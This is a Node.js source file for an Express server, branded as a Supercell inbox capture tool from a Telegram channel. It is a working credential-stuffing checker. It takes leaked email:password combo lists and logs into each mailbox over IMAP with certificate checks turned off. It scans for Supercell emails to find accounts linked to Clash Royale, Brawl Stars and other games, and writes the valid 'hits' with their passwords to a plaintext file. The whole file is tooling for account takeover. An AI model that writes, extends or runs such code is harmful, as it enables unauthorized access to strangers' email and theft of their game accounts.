const fs = require('fs');
const path = require('path');
const imapsimple = require('imap-simple');
const { simpleParser } = require('mailparser');
const express = require('express');
const http = require('http');

// ================= CONFIGURATION =================
const CONFIG = {
    PORT: process.env.PORT || 3000, 
    HOST: '0.0.0.0',
    WORKERS: 5,
    SEARCH_FROM: "noreply@id.supercell.com",
    GAMES: ["Clash Royale", "Clash of Clans", "Hay Day", "Squad Busters", "Brawl Stars"],
    KEYWORDS: [
        "email address changed", "email adresse geändert", "adresse email modifiée",
        "cambio de dirección de correo", "メールアドレスが変更されました", "変更されたメールアドレス",
        "adresse e-mail changée", "メールアドレス変更", "adresa e-pošte je promijenjena",
        "домен почты изменен", "dirección de correo electrónico cambiada", "email адрес изменен",
        "adresse email changée", "cambiato indirizzo email", "e-posti aadress on muutunud",
        "adresa e-mail promijenjena", "correo electrónico cambiado", "adresa электронной почты изменена",
        "email id変更されました", "πολλαπλή διεύθυνση ηλεκτρονικού ταχυδρομείου άλλαξε",
        "คำแนะนำอีเมล์ถูกเปลี่ยน", "أن تغيير البريد الإلكتروني", "adresse email modifié",
        "correo de dirección cambiado", "cambio dirección correo", "Εχει αλλάξει η διεύθυνση ηλεκτρονικού ταχυδρομείου",
        "الإيميل تم تغييره", "電子郵件地址更改", "تم تغي", "anasxzer00", "xxxx_private", "daikt bgem tool edit kay"
    ],
    OUTPUT_FILE: "Supercell-Hits.txt",
    TIMEOUT: 15000
};

// ================= STATE MANAGEMENT =================
let globalStats = {
    hits: 0,
    bad: 0,
    unlink: 0,
    errors: 0,
    games: {
        "Clash Royale": 0,
        "Clash of Clans": 0,
        "Hay Day": 0,
        "Squad Busters": 0,
        "Brawl Stars": 0
    }
};

let isProcessing = false;
let currentSessionId = null;

// ================= UTILITIES =================

function parseComboInput(input) {
    const normalized = input.replace(/\n/g, ',').replace(/\s+/g, ' ').trim();
    if (normalized.includes('.txt') || normalized.includes('/') || normalized.includes('\\')) {
        return { type: 'file', path: normalized };
    }
    const pairs = normalized.split(/[, ]+/).filter(p => p.includes(':'));
    return { type: 'list', items: pairs };
}

async function loadCombos(inputData) {
    if (inputData.type === 'file') {
        const filePath = path.resolve(inputData.path);
        if (!fs.existsSync(filePath)) throw new Error(`File not found: ${filePath}`);
        const content = fs.readFileSync(filePath, 'utf-8');
        return content.split('\n').filter(line => line.includes(':') && line.trim() !== '');
    }
    return inputData.items;
}

// ================= CORE LOGIC =================

async function checkSupercellAccount(emailAccount, sessionId = 'single') {
    const [email, password] = emailAccount.split(':');
    if (!email || !password) return { status: 'error', message: 'Malformed pair' };

    const domain = email.split('@')[1];
    const imapHost = `imap.${domain}`;

    try {
        // ✅ FIXED: Correct imap-simple connection syntax
        const config = {
            imap: {
                user: email,
                password: password,
                host: imapHost,
                port: 993,
                tls: true,
                tlsOptions: { rejectUnauthorized: false },
                authTimeout: CONFIG.TIMEOUT,
                connectionTimeout: CONFIG.TIMEOUT
            }
        };

        const connection = await imapsimple.connect(config);
        const inbox = await connection.openBox('INBOX', true);
        
        const searchCriteria = [['FROM', CONFIG.SEARCH_FROM]];
        const searchResult = await inbox.search(searchCriteria);
        
        let linkedGames = new Set();
        let isUnlink = false;
        let isHit = false;

        if (searchResult.length > 0) {
            const fetchResult = await inbox.fetch(searchResult.slice(0, 50), { bodies: [''] });
            
            for (const msg of fetchResult) {
                const body = msg.parts.find(part => part.which === '');
                if (!body) continue;

                const parsed = await simpleParser(body.body);
                const subject = (parsed.subject || "").toLowerCase();
                const textBody = (parsed.text || parsed.html || "").toLowerCase();

                const keywordRegex = new RegExp(CONFIG.KEYWORDS.join('|'), 'i');
                
                if (keywordRegex.test(subject) || keywordRegex.test(textBody)) {
                    isUnlink = true;
                    break; // No need to check further if unlinked
                }

                if (subject.includes(CONFIG.SEARCH_FROM.toLowerCase()) || textBody.includes(CONFIG.SEARCH_FROM.toLowerCase())) {
                    isHit = true;
                }

                for (const game of CONFIG.GAMES) {
                    if (subject.includes(game.toLowerCase()) || textBody.includes(game.toLowerCase())) {
                        linkedGames.add(game);
                    }
                }
            }
        }

        await inbox.closeBox();
        await connection.end();

        return {
            email,
            password,
            isUnlink,
            isHit,
            linkedGames: Array.from(linkedGames)
        };

    } catch (error) {
        return {
            email,
            password,
            error: error.message
        };
    }
}

// ================= EXPRESS SERVER =================

const app = express();
app.use(express.json({ limit: '10mb' }));

// 1. Health Check
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        processing: isProcessing,
        sessionId: currentSessionId,
        stats: globalStats
    });
});

// 2. ✅ NEW: Single Combo Check Endpoint (Matches React Native Frontend)
app.post('/api/check', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ status: 'error', message: 'Missing email or password', games: [] });
    }

    try {
        const result = await checkSupercellAccount(`${email}:${password}`, 'single');
        
        if (result.error) {
            // Distinguish between wrong password (bad) and actual network/server error
            const errLower = result.error.toLowerCase();
            if (errLower.includes('authentication') || errLower.includes('invalid credentials') || 
                errLower.includes('login failed') || errLower.includes('no login methods')) {
                
                globalStats.bad++;
                return res.json({ status: 'bad', message: 'Invalid credentials', games: [] });
            }
            
            globalStats.errors++;
            return res.json({ status: 'error', message: result.error, games: [] });
        }

        if (result.isUnlink) {
            globalStats.unlink++;
            return res.json({ status: 'unlink', message: 'Account unlinked', games: result.linkedGames });
        }

        if (result.isHit || result.linkedGames.length > 0) {
            globalStats.hits++;
            result.linkedGames.forEach(game => {
                globalStats.games[game] = (globalStats.games[game] || 0) + 1;
            });

            const logEntry = `${result.email}:${result.password} | Linked = ${JSON.stringify(result.linkedGames)}\n`;
            fs.appendFileSync(CONFIG.OUTPUT_FILE, logEntry);
            
            return res.json({ status: 'hit', message: 'Valid account', games: result.linkedGames });
        }

        // No Supercell emails found at all
        globalStats.bad++;
        return res.json({ status: 'bad', message: 'No Supercell emails found', games: [] });

    } catch (err) {
        globalStats.errors++;
        return res.status(500).json({ status: 'error', message: err.message, games: [] });
    }
});

// 3. Bulk Capture Endpoint (Kept for backward compatibility / alternative use)
app.post('/api/capture', async (req, res) => {
    const { comboInput } = req.body;
    if (!comboInput) return res.status(400).json({ error: "Combo input required" });
    if (isProcessing) return res.status(409).json({ error: "A capture session is already running" });

    isProcessing = true;
    currentSessionId = Date.now().toString();

    try {
        const parsedInput = parseComboInput(comboInput);
        const comboList = await loadCombos(parsedInput);
        if (comboList.length === 0) throw new Error("No valid combos found");

        res.setHeader('Content-Type', 'text/event-stream');
        res.setHeader('Cache-Control', 'no-cache');
        res.setHeader('Connection', 'keep-alive');

        const sendUpdate = (data) => res.write(`data: ${JSON.stringify(data)}\n\n`);
        sendUpdate({ type: 'status', message: `Started. Loaded ${comboList.length} combos.` });

        let completed = 0;
        const total = comboList.length;

        // Process sequentially or with limited concurrency to avoid IMAP bans
        for (const task of comboList) {
            if (!isProcessing) break; // Allow cancellation
            
            const result = await checkSupercellAccount(task, currentSessionId);
            completed++;

            if (result.error) {
                globalStats.bad++;
            } else if (result.isUnlink) {
                globalStats.unlink++;
            } else if (result.isHit || result.linkedGames.length > 0) {
                globalStats.hits++;
                result.linkedGames.forEach(game => { globalStats.games[game] = (globalStats.games[game] || 0) + 1; });
                fs.appendFileSync(CONFIG.OUTPUT_FILE, `${result.email}:${result.password} | ${JSON.stringify(result.linkedGames)}\n`);
                sendUpdate({ type: 'hit', email: result.email, games: result.linkedGames });
            } else {
                globalStats.bad++;
            }

            if (completed % 5 === 0 || completed === total) {
                sendUpdate({ type: 'stats', data: globalStats, progress: { completed, total } });
            }
        }

        sendUpdate({ type: 'complete', message: 'Session finished', stats: globalStats });
        res.end();
    } catch (error) {
        console.error("Capture Error:", error);
        if (!res.headersSent) {
            res.status(500).json({ error: error.message });
        } else {
            res.write(`data: ${JSON.stringify({ type: 'error', message: error.message })}\n\n`);
            res.end();
        }
    } finally {
        isProcessing = false;
        currentSessionId = null;
    }
});

app.get('/api/stats', (req, res) => {
    res.json({ processing: isProcessing, sessionId: currentSessionId, stats: globalStats });
});

// ================= START SERVER =================
const server = http.createServer(app);

server.listen(CONFIG.PORT, CONFIG.HOST, () => {
    console.log(`
╔══════════════════════════════════════════════════════════╗
║ Supercell Inbox Capture API                              ║
║ Developer: @yh_ka | Channel: t.me/machitools             ║
║ Server running on ${CONFIG.HOST}:${CONFIG.PORT}                       ║
║ Timeout: ${CONFIG.TIMEOUT}ms                                          ║
╚══════════════════════════════════════════════════════════╝
    `);
});

process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
process.on('unhandledRejection', (reason, promise) => console.error('Unhandled Rejection:', reason));